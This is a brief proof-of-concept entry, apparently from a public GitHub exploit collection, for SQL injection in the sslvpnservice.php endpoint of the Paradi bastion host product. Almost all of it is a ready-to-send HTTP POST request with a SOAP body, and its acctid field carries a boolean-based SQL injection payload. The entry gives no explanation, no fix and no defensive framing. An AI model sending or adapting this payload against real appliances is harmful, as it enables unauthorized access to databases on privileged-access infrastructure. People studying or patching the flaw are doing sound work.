# pld_sslvpnservice.php_sqli

product: 帕拉迪堡垒机
```
POST /sslvpnservice.php HTTP/1.1
Host: xxxx
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580

<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1*,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>
```

from: https://github.com/wy876/POC/blob/main/%E5%B8%95%E6%8B%89%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E5%B8%95%E6%8B%89%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BAsslvpnservice.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
